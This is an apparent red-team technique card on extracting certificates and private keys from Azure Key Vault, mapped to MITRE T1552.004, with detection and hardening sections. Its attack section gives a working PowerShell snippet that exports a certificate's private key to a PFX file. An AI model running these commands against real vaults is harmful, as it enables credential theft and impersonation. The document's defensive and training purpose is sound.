# [CA-UNSC-009]: Azure Key Vault Keys/Certs Extraction

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | CA-UNSC-009 |
| **MITRE ATT&CK v18.1** | [Unsecured Credentials: Private Keys (T1552.004)](https://attack.mitre.org/techniques/T1552/004/) |
| **Tactic** | Credential Access |
| **Platforms** | Azure |
| **Severity** | **High** |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** Beyond simple secrets, Key Vaults store Cryptographic Keys (RSA/EC) and Certificates (PFX). While keys marked "Non-Exportable" cannot be retrieved, Certificates (containing the private key) are often exportable. An attacker can download these certificates to impersonate applications or decrypt traffic.
- **Attack Surface:** Key Vault Certificates.
- **Business Impact:** **Identity Theft**.

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** `Key Vault Certificates User` or Access Policy `Get`.
- **Tools:**
    - Azure CLI
    - [MicroBurst](https://github.com/NetSPI/MicroBurst)

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Export Certificate**
```powershell
# Get the secret ID associated with the certificate (certs are stored as secrets)
$cert = Get-AzKeyVaultCertificate -VaultName "TargetKV" -Name "AppCert"
$secret = Get-AzKeyVaultSecret -VaultName "TargetKV" -Name "AppCert"

# Save PFX
$pfxBytes = [Convert]::FromBase64String($secret.SecretValueText)
[IO.File]::WriteAllBytes("C:\Temp\AppCert.pfx", $pfxBytes)
```

## 5. DETECTION (Blue Team Operations)

#### 5.1 Azure Monitor
| Source | Operation | Filter Logic |
|---|---|---|
| **KeyVault** | `CertificateGet` / `SecretGet` | Access to certificate objects. |

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **Export Policy:** When creating certificates, set the Private Key `Exportable` flag to **No**.
*   **Monitoring:** Alert on `CertificateExport` events.

## 7. ATTACK CHAIN
> **Preceding Technique:** [IA-CLOUD-001]
> **Next Logical Step:** [CA-KERB-009] (If cert is for AD user)
